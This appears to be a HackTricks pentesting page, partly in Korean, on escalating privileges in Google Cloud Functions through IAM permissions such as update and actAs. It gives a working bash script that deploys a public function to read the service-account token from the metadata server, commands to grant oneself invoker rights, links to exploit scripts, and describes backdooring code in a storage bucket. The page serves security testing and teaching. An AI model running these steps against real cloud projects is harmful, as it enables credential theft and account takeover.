# GCP - Cloudfunctions Privesc

{{#include ../../../banners/hacktricks-training.md}}

## cloudfunctions

More information about Cloud Functions:

{{#ref}}
../gcp-services/gcp-cloud-functions-enum.md
{{#endref}}

### `cloudfunctions.functions.create` , `cloudfunctions.functions.sourceCodeSet`_,_ `iam.serviceAccounts.actAs`

이 권한을 가진 공격자는 **임의(악성) 코드로 새로운 Cloud Function을 생성하고 Service Account를 할당할 수 있다**. 그런 다음 metadata에서 Service Account token을 leak하여 해당 계정으로 권한을 상승시킬 수 있다.\
함수를 트리거하기 위해 일부 추가 권한이 필요할 수 있다.

Exploit scripts for this method can be found [here](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudfunctions.functions.create-call.py) and [here](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudfunctions.functions.create-setIamPolicy.py) and the prebuilt .zip file can be found [here](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/tree/master/ExploitScripts/CloudFunctions).

### `cloudfunctions.functions.update` , `cloudfunctions.functions.sourceCodeSet`_,_ `iam.serviceAccounts.actAs`

이 권한을 가진 공격자는 **Function의 코드를 수정하고 연결된 service account를 변경하여 token을 exfiltrating하는 것을 목표로 할 수 있다.**

> [!CAUTION]
> In order to deploy cloud functions you will also need actAs permissions over the default compute service account or over the service account that is used to build the image.

Some extra privileges like `.call` permission for version 1 cloudfunctions or the role `role/run.invoker` to trigger the function might be required.
```bash
# Create new code
temp_dir=$(mktemp -d)

cat > $temp_dir/main.py <<EOF
import subprocess

def main(request):
cmd = "curl -s -f -H 'Metadata-Flavor: Google' 'http://metadata/computeMetadata/v1/instance/service-accounts/default/token'"
result = subprocess.check_output(cmd, shell=True, text=True)
return result
EOF

echo "" > $temp_dir/requirements.txt

zip -r $temp_dir/function.zip $temp_dir/main.py $temp_dir/requirements.txt

# Update code
gcloud functions deploy <cloudfunction-name> \
--runtime python312 \
--source $temp_dir \
--entry-point main \
--service-account <sa>@$PROJECT_ID.iam.gserviceaccount.com \
--trigger-http \
--allow-unauthenticated

# Get SA token calling the new function code
gcloud functions call <cloudfunction-name>
```
> [!CAUTION]
> 에러 `Permission 'run.services.setIamPolicy' denied on resource...`가 발생하면, 이는 `--allow-unauthenticated` 파라미터를 사용 중이며 해당 작업을 수행할 충분한 권한이 없기 때문입니다.

The exploit script for this method can be found [here](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/cloudfunctions.functions.update.py).

### `cloudfunctions.functions.sourceCodeSet`

이 권한으로 함수 버킷에 파일을 업로드할 수 있는 **서명된 URL**을 얻을 수 있습니다(하지만 함수의 코드는 변경되지 않으므로 직접 업데이트해야 합니다)
```bash
# Generate the URL
curl -X POST https://cloudfunctions.googleapis.com/v2/projects/{project-id}/locations/{location}/functions:generateUploadUrl \
-H "Authorization: Bearer $(gcloud auth application-default print-access-token)" \
-H "Content-Type: application/json" \
-d '{}'
```
이 권한만으로 attackers 관점에서 얼마나 유용한지는 잘 모르겠지만, 알아두면 좋다.

### `cloudfunctions.functions.setIamPolicy` , `iam.serviceAccounts.actAs`

escalate하려면 이전에 언급된 **`.update`** 또는 **`.create`** privileges 중 하나를 자신에게 부여하세요.
```bash
gcloud functions add-iam-policy-binding <NOMBRE_FUNCION> \
--region=<REGION> \
--member="<MIEMBRO>" \
--role="roles/cloudfunctions.invoker"
```
### `cloudfunctions.functions.update`

오직 **`cloudfunctions`** 권한만 가지고 있고 **`iam.serviceAccounts.actAs`** 권한이 없다면, **함수를 업데이트할 수 없습니다. 따라서 이는 유효한 PRIVESC가 아닙니다.**

### 함수 호출

`cloudfunctions.functions.get`, `cloudfunctions.functions.invoke`, `run.jobs.run`, 및 `run.routes.invoke` 권한이 있으면 주체가 Cloud Functions를 직접 호출할 수 있습니다. 또한 함수가 공개 트래픽을 허용하거나 호출자가 함수 자체와 동일한 네트워크 내에 있어야 합니다.
```bash
curl -X POST "https://<FUNCTION_URL>" \
-H "Authorization: bearer $(gcloud auth print-identity-token)" \
-H "Content-Type: application/json" \
-d '{  "name": "Developer" }'
```
### Read & Write Access over the bucket

bucket에 대해 읽기 및 쓰기 권한이 있으면 코드 변경을 모니터링할 수 있으며, **bucket에서 업데이트가 발생할 때마다 새 코드를 자신이 작성한 코드로 교체할 수 있습니다**. 그러면 새 버전의 Cloud Function이 제출된 백도어 코드로 실행됩니다.

You can check more about the attack in:

{{#ref}}
gcp-storage-privesc.md
{{#endref}}

하지만 타사 Cloud Function을 사전 침해(pre-compromise)하는 데에는 이를 사용할 수 없습니다. 자신의 계정에 bucket을 생성하고 외부 프로젝트가 쓸 수 있도록 공개 권한을 부여하면 다음과 같은 오류가 발생합니다:

<figure><img src="../../../images/image (1) (1) (1).png" alt="" width="304"><figcaption></figcaption></figure>

> [!CAUTION]
> 하지만 이는 DoS 공격에 악용될 수 있습니다.

### Read & Write Access over Artifact Registry

Cloud Function이 생성되면 프로젝트의 Artifact Registry로 새 docker 이미지가 푸시됩니다. 이미지를 새 이미지로 변경해 보거나 현재 이미지(및 `cache` 이미지)를 삭제해 보았지만 아무 것도 바뀌지 않았고, Cloud Function은 계속 동작했습니다. 따라서 bucket과 마찬가지로 실행될 docker 컨테이너를 바꾸기 위해 **Race Condition 공격을 악용할 가능성은 있을 수 있지만**, **저장된 이미지를 단순히 수정하는 것만으로는 Cloud Function을 침해할 수 없습니다**.

## 참고자료

- [https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/)

{{#include ../../../banners/hacktricks-training.md}}
